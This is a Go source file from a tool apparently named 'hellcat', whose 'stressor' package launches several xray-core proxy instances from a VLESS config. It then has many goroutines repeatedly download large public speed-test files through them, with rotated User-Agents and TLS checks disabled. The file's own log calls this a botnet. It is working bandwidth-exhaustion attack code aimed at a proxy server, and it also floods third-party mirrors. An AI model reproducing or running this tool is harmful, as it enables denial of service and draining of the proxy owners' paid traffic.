// [hellcat]
package stressor

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"sync"
	"sync/atomic"
	"time"

	"hellcat/config"
	"hellcat/parser"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"curl/7.88.1",
	"Wget/1.21",
	"Go-http-client/1.1",
}

var payloads = []string{
	"http://speedtest.tele2.net/10GB.zip",
	"http://speed.hetzner.de/10GB.bin",
	"http://proof.ovh.net/files/10Gb.dat",
	"http://ipv4.download.thinkbroadband.com/10GB.zip",
}

var (
	requests uint64
	errors   uint64
)

func Run(cfg *parser.VLESSConfig, threads int, duration int, numXray int) {
	log.Printf("[hellcat] Starting botnet: %d xray-core instances + %d threads (threads per process)", numXray, threads)

	var wg sync.WaitGroup
	stop := make(chan struct{})
	var configFiles []string

	if duration > 0 {
		go func() {
			time.Sleep(time.Duration(duration) * time.Second)
			close(stop)
		}()
	}

	basePort := 10808
	proxies := []string{}

	// Generate configs and start xray processes
	for i := 0; i < numXray; i++ {
		port := basePort + i
		confPath := config.GenerateWithPort(cfg, port)
		configFiles = append(configFiles, confPath)

		proxyAddr := fmt.Sprintf("socks5h://127.0.0.1:%d", port)
		proxies = append(proxies, proxyAddr)

		go startXrayProcess(confPath, i)
	}

	// Create HTTP clients for each proxy
	var clients []*http.Client
	for _, proxy := range proxies {
		proxyURL, _ := url.Parse(proxy)
		client := &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
				DialContext: (&net.Dialer{
					Timeout:   10 * time.Second,
					KeepAlive: 10 * time.Second,
				}).DialContext,
				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
				DisableKeepAlives:   true,
				MaxIdleConns:        0,
				MaxIdleConnsPerHost: 0,
			},
			Timeout: 0,
		}
		clients = append(clients, client)
	}


	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(index int) {
			defer wg.Done()
			client := clients[index%len(clients)]
			for {
				select {
				case <-stop:
					return
				default:
					runHeavyStream(client)
				}
			}
		}(i)
	}


	go func() {
		for {
			time.Sleep(5 * time.Second)
			succ := atomic.SwapUint64(&requests, 0)
			fail := atomic.SwapUint64(&errors, 0)
			total := succ + fail
			var errRate float64
			if total > 0 {
				errRate = (float64(fail) / float64(total)) * 100
			}
			log.Printf("[hellcat] Stats: %d successful, %d errors (%.1f%%)", succ, fail, errRate)
		}
	}()

	wg.Wait()

	// Cleanup configs
	for _, path := range configFiles {
		if err := os.Remove(path); err == nil {
			log.Printf("[hellcat] Deleted config: %s", path)
		}
	}
}

func runHeavyStream(client *http.Client) {
	var wg sync.WaitGroup
	for i := 0; i < 20; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			downloadOnce(client)
		}()
	}
	wg.Wait()
}

func downloadOnce(client *http.Client) {
	target := payloads[rand.Intn(len(payloads))]
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	resp, err := client.Do(req)
	if err != nil || resp.Body == nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	defer resp.Body.Close()

	if _, err := io.Copy(io.Discard, resp.Body); err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	atomic.AddUint64(&requests, 1)
}

func startXrayProcess(configPath string, index int) {
	cmd := exec.Command("xray", "-c", configPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		log.Printf("[hellcat] Failed to start xray [%d]: %v", index, err)
		return
	}
	log.Printf("[hellcat] xray-core started (PID %d) with config %s", cmd.Process.Pid, configPath)
}
